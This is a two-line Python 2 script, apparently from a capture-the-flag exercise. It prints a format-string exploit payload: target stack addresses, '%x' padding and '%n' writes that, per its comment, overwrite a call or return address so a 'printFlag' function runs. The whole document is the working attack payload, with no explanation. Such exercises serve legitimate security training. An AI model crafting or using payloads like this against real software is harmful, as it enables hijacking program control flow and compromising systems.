# overwrite called/ret function to printFlag 
print "\x2c\xf7\xff\xbf" + "A" + "BBBBBCC" + "\x2e\xf7\xff\xbf"  + "%x"*24 +"%34432x" + "%n"  + "%x" + "%32977x" + "%n"